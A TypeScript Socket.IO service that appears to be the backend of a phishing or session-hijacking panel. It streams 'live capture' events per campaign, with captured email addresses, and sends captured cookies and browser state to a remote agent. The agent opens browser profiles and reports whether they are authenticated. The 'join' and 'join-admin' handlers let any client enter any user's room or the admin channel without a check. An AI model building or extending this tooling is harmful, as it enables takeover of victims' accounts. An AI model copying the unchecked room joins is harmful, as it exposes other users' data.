import { Server as SocketIOServer } from 'socket.io';
import { Server as HttpServer } from 'http';
import { logger } from '../utils/logger.util';
import prisma from '../config/database';

export class WebSocketService {
  private io: SocketIOServer | null = null;
  private agentSockets: Map<string, string> = new Map(); // userId -> socketId

  /**
   * Initialize WebSocket server
   */
  initialize(httpServer: HttpServer): void {
    // CORS - Use environment variable for production, fallback to localhost for dev
    const corsOrigins = process.env.CORS_ORIGINS 
      ? process.env.CORS_ORIGINS.split(',').map(o => o.trim())
      : [
          'http://localhost:3000',
          'http://localhost:3001',
          'https://fioona.org',
          process.env.WEB_PANEL_URL || '',
        ];

    this.io = new SocketIOServer(httpServer, {
      cors: {
        origin: corsOrigins.filter(Boolean),
        credentials: true,
      },
      transports: ['websocket', 'polling'],
    });

    // Connection handler
    this.io.on('connection', (socket) => {
      logger.info(`WebSocket client connected: ${socket.id}`);

      // Join user-specific room
      socket.on('join', (data: { userId: string; role: string }) => {
        const room = `user:${data.userId}`;
        socket.join(room);
        logger.info(`Client ${socket.id} joined room: ${room}`);
      });

      // Join admin broadcast room
      socket.on('join-admin', () => {
        socket.join('admin-broadcast');
        logger.info(`Client ${socket.id} joined admin broadcast`);
      });

      socket.on('agent-ready', (data: { userId: string }) => {
        const agentRoom = `agent:${data.userId}`;
        socket.join(agentRoom);
        this.agentSockets.set(data.userId, socket.id);
        logger.info(`Agent connected for user ${data.userId}: socket ${socket.id}`);
        socket.emit('agent-ack', { status: 'connected', userId: data.userId });
      });

      socket.on('launch-result', async (data: {
        profileId: string;
        userId: string;
        success: boolean;
        authenticated: boolean;
        email?: string;
        error?: string;
      }) => {
        logger.info(`Launch result from agent: ${data.profileId} — ${data.success ? 'OK' : 'FAILED'}`);

        // Only upgrade to AUTHENTICATED — never downgrade based on launch failure.
        // The capture authStatus set at login time is the source of truth.
        if (data.success && data.authenticated) {
          try {
            await prisma.profile.update({
              where: { id: data.profileId },
              data: { authStatus: 'AUTHENTICATED' },
            });
          } catch (err: any) {
            logger.error('Failed to update authStatus after launch:', err.message);
          }
        }

        this.io?.to(`user:${data.userId}`).emit('launch-result', {
          profileId: data.profileId,
          success: data.success,
          authenticated: data.authenticated,
          email: data.email,
          error: data.error,
        });
      });

      socket.on('close-result', (data: { profileId: string; userId: string; success: boolean }) => {
        logger.info(`Close result from agent: ${data.profileId}`);
        this.io?.to(`user:${data.userId}`).emit('close-result', {
          profileId: data.profileId,
          success: data.success,
        });
      });

      // Disconnect handler
      socket.on('disconnect', () => {
        for (const [userId, socketId] of this.agentSockets.entries()) {
          if (socketId === socket.id) {
            this.agentSockets.delete(userId);
            logger.info(`Agent disconnected for user ${userId}`);
            break;
          }
        }
        logger.info(`WebSocket client disconnected: ${socket.id}`);
      });
    });

    logger.success('WebSocket server initialized');
  }

  /**
   * Broadcast live capture event to user
   */
  broadcastLiveCapture(userId: string, data: {
    sessionId: string;
    campaignId: string;
    campaignName: string;
    stage: string;
    email?: string;
    timestamp: Date;
  }): void {
    if (!this.io) return;

    const room = `user:${userId}`;
    this.io.to(room).emit('live-capture', {
      type: 'LIVE_CAPTURE',
      ...data,
      timestamp: data.timestamp.toISOString(),
    });

    logger.debug(`Live capture broadcast to ${room}:`, data.sessionId);
  }

  /**
   * Broadcast resource warning
   */
  broadcastResourceWarning(type: 'memory' | 'cpu' | 'capacity', data: {
    message: string;
    severity: 'warning' | 'critical';
    metrics: any;
  }): void {
    if (!this.io) return;

    this.io.to('admin-broadcast').emit('resource-warning', {
      type: 'RESOURCE_WARNING',
      warningType: type,
      ...data,
      timestamp: new Date().toISOString(),
    });

    logger.warn(`Resource warning broadcast: ${type} - ${data.message}`);
  }

  /**
   * Broadcast session status update
   */
  broadcastSessionUpdate(userId: string, data: {
    sessionId: string;
    stage: string;
    status: string;
  }): void {
    if (!this.io) return;

    const room = `user:${userId}`;
    this.io.to(room).emit('session-update', {
      type: 'SESSION_UPDATE',
      ...data,
      timestamp: new Date().toISOString(),
    });
  }

  /**
   * Broadcast profile status update
   */
  broadcastProfileUpdate(userId: string, data: {
    profileId: string;
    event: 'launched' | 'closed' | 'idle-warning';
    email: string;
  }): void {
    if (!this.io) return;

    const room = `user:${userId}`;
    this.io.to(room).emit('profile-update', {
      type: 'PROFILE_UPDATE',
      ...data,
      timestamp: new Date().toISOString(),
    });
  }

  /**
   * Broadcast system stats (for admin dashboard)
   */
  broadcastSystemStats(stats: {
    memory: any;
    cpu: any;
    sessions: any;
    profiles: any;
    uptime: number;
  }): void {
    if (!this.io) return;

    this.io.to('admin-broadcast').emit('system-stats', {
      type: 'SYSTEM_STATS',
      ...stats,
      timestamp: new Date().toISOString(),
    });
  }

  sendLaunchCommand(userId: string, data: {
    profileId: string;
    cookies: any[];
    email: string;
    browserState?: string | null;
  }): boolean {
    if (!this.io || !this.hasAgentConnected(userId)) return false;
    this.io.to(`agent:${userId}`).emit('launch-profile', { ...data, userId });
    logger.info(`Launch command sent to agent for user ${userId}: ${data.profileId}`);
    return true;
  }

  sendCloseCommand(userId: string, profileId: string): boolean {
    if (!this.io || !this.hasAgentConnected(userId)) return false;
    this.io.to(`agent:${userId}`).emit('close-profile', { profileId, userId });
    logger.info(`Close command sent to agent for user ${userId}: ${profileId}`);
    return true;
  }

  hasAgentConnected(userId: string): boolean {
    return this.agentSockets.has(userId);
  }

  /**
   * Get IO instance (for external use)
   */
  getIO(): SocketIOServer | null {
    return this.io;
  }
}

export default new WebSocketService();
